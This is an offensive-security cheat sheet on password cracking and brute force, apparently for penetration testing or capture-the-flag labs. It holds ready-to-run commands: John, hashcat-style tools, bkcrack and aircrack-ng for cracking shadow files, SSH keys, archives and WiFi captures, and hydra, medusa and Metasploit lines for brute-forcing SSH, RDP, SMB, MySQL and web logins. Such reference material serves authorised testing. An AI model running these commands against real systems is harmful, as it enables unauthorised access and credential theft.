# BruteForce

## Default Credentials <a href="#default-credentials" id="default-credentials"></a>

* [https://cirt.net/passwords](https://cirt.net/passwords)
* [https://default-password.info/](https://default-password.info/)
* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

## Cisco Passwords <a href="#cisco-passwords" id="cisco-passwords"></a>

| Info                    | Command                                                                                                                                                          |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Type 5 Password Cracker | [https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html](https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html) |
| Type 7 Password Cracker | [https://www.ifm.net.nz/cookbooks/passwordcracker.html](https://www.ifm.net.nz/cookbooks/passwordcracker.html)                                                   |

## Identifying Hashes <a href="#identifying-hashes" id="identifying-hashes"></a>

| Info                                      | Command                                     |
| ----------------------------------------- | ------------------------------------------- |
| Kali default                              | `hash-identifier`                           |
| Best outputs Hashcat mode number if known | `haiti`                                     |
| Clone Hait repo                           | `git clone https://github.com/noraj/haiti/` |
| Install haiti-hash                        | `sudo gem install haiti-hash`               |

## Files <a href="#files" id="files"></a>

<table><thead><tr><th width="201.33333333333331">File / Hash</th><th width="181" align="center">Description</th><th>Command</th></tr></thead><tbody><tr><td>Group Policy Pref</td><td align="center">gpp-decrypt</td><td><code>gpp-decrypt</code></td></tr><tr><td>Fernet</td><td align="center">Decrypt using key</td><td><a href="https://asecuritysite.com/encryption/ferdecode">https://asecuritysite.com/encryption/ferdecode</a></td></tr><tr><td>Linux (Shadow File)</td><td align="center">Unshadow the file</td><td><code>unshadow passwd.txt shadow.txt > unshadowed.txt</code></td></tr><tr><td>Linux (Shadow File)</td><td align="center">Crack with John</td><td><code>john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></td></tr><tr><td>SSH keys</td><td align="center">Extract hash</td><td><code>python ssh2john.py id_rsa > id_rsa.hash</code></td></tr><tr><td>SSH keys</td><td align="center">Crack with John</td><td><code>john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt</code></td></tr><tr><td>Zip Files</td><td align="center">Fcrackzip</td><td><code>fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' $zip.zip</code></td></tr><tr><td>Zip Files</td><td align="center">zip2john (extract hash)</td><td><code>zip2john $zip.zip > hash.hash</code></td></tr><tr><td>Zip Files</td><td align="center">zip2john (crack john)</td><td><code>john --wordlist=/usr/share/wordlists/rockyou.txt tom.hash</code></td></tr><tr><td>GPG Files</td><td align="center">Import Key</td><td><code>gpg --import priv.key</code></td></tr><tr><td>GPG Files</td><td align="center">Decrypt File</td><td><code>gpg --decrypt CustomerDetails.xlsx.gpg</code></td></tr><tr><td>JWT Tokens</td><td align="center"></td><td><code>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></td></tr><tr><td>PCAP (WIFI)</td><td align="center">Wifi Attack file</td><td><code>aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt</code></td></tr><tr><td>PDF</td><td align="center"></td><td><code>tools/JohnTheRipper/pdf2john.pl encrypted.pdf > hash</code></td></tr><tr><td></td><td align="center"></td><td><code>pdftotext -upw 01021980D encrypted.pdf</code></td></tr></tbody></table>



## Zip Plaintext <a href="#zip-plaintext" id="zip-plaintext"></a>

1. List archive contents (Find known file)`7z l file.zip`
2. List archive contents extended infomation (Get file CRC) `7z l uploaded-file-3422.zip -slt`
3. Load Python `python3`
4. Import binascii module `import binascii`
5. Read known file`with open('/home/kali/.bash_logout', 'rb') as f:`
6. Set variable (Keep 4 spaces at start) `data = f.read()`
7. Hit enter to leave blank line `<ENTER>`
8. Enter the data variable `data`
9. Calculate CRC of file check it matches the one found in step 2 `hex(binascii.crc32(data) & 0xFFFFFFFF)`
10. Add known file to a zip file `zip plain.zip bash_logout`
11. \-C Encrypted zip file, -c known file, -P unencrypted zip, -p Name of file in unencrypted zip `/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p bash_logout`
12. \-C Encrypted zip file, -k keys found in step 11, -U output archive name, password (pass) `/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U uploaded-file-3422-pass.zip pass`
13. Unzip archive with the password (pass) `unzip uploaded-file-3422-pass.zip -d unzipped/`

## Services <a href="#services" id="services"></a>

<table><thead><tr><th width="116.33333333333331">Service</th><th width="173" align="center">Description</th><th>Command</th></tr></thead><tbody><tr><td>FTP</td><td align="center">Known user and rockyou password list</td><td><code>hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></td></tr><tr><td>HTTP</td><td align="center">hydra http-post request known user</td><td><code>hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "&#x3C;Login Page>:&#x3C;Request Body>:&#x3C;Error Message>" -v -V</code></td></tr><tr><td>HTTP</td><td align="center">hydra http-get request known users</td><td><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I</code></td></tr><tr><td>MYSQL</td><td align="center">Known user and rockyou password list</td><td><code>hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip mysql</code></td></tr><tr><td>MYSQL</td><td align="center">Known user and rockyou password list</td><td><code>medusa -v 4 -h $ip -M mysql -u root -P /usr/share/wordlists/rockyou.txt -t 40</code></td></tr><tr><td>MYSQL</td><td align="center">Username list and rockyou password list</td><td><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip mysql</code></td></tr><tr><td>MYSQL</td><td align="center">Metasploit</td><td><code>use auxiliary/scanner/mysql/mysql_login</code></td></tr><tr><td>ORACLE</td><td align="center">Hyra password attach rockyou</td><td><code>hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 $ip oracle-listener</code></td></tr><tr><td>POP3</td><td align="center">Known user and rockyou password list</td><td><code>hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip pop3 -V</code></td></tr><tr><td>RDP</td><td align="center">Known user and rockyou password list</td><td><code>hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></td></tr><tr><td>RDP</td><td align="center">Known user and rockyou password list</td><td><code>ncrack -vv --user $user -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></td></tr><tr><td>SMB</td><td align="center">Metasploit</td><td><code>hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt $ip smb</code></td></tr><tr><td>SMB</td><td align="center">Known user and rockyou password list</td><td><code>use auxiliary/scanner/smb/smb_login</code></td></tr><tr><td>SMB</td><td align="center">User &#x26; password list</td><td><code>crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success</code></td></tr><tr><td>SMTP</td><td align="center">Known user and rockyou password list</td><td><code>hydra -P /usr/share/wordlists/rockyou.txt $ip smtp -V</code></td></tr><tr><td>SNMP</td><td align="center">Known user and rockyou password list</td><td><code>hydra -P /usr/share/wordlists/rockyou.txt -v $ip snmp</code></td></tr><tr><td>SSH</td><td align="center">Enumerate users with metasploit</td><td><code>use auxiliary/scanner/ssh/ssh_enumusers</code></td></tr><tr><td>SSH</td><td align="center">Quick Known user and rockyou password list</td><td><code>hydra $ip -s 22 ssh -l gaara -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -F</code></td></tr><tr><td>SSH</td><td align="center">Known user and rockyou password list</td><td><code>hydra $ip -s 22 ssh -l $user -P /usr/share/wordlists/rockyou.txt -V -F</code></td></tr><tr><td>SSH</td><td align="center">Username list and rockyou password list</td><td><code>hydra -F -L users.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip</code></td></tr></tbody></table>

## Web Services <a href="#web-services" id="web-services"></a>

|                  Description                 | Command                                                                                                                                                                     |
| :------------------------------------------: | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| set variable for post/hydra - command layout | `export post=<Login Page>:<Request Body>:<Error Message>`                                                                                                                   |
|     set variable for post/hydra - example    | `export post='/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-660&User=^USER^&Password=^PASS^:Login failed!'`                                                 |
| create & mutate wordlist (All sites / pages) | `cewl $ip -m 4 -w wordlist.txt; john --wordlist=wordlist.txt --rules --stdout > mutated.txt`                                                                                |
|                hydra wordlist                | `hydra -l root@localhost -P wordlist.txt $ip http-post-form "$post"`                                                                                                        |
|                 hydra mutated                | `hydra -l root@localhost -P mutated.txt $ip http-post-form "$post"`                                                                                                         |
|                 hydra rockyou                | `hydra -l root@localhost -P/usr/share/wordlists/rockyou.txt $ip http-post-form "$post"`                                                                                     |
|                   Wordpress                  | `hydra -l admin -P /usr/share/wordlists/rockyou.txt sunset-midnight -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 64` |
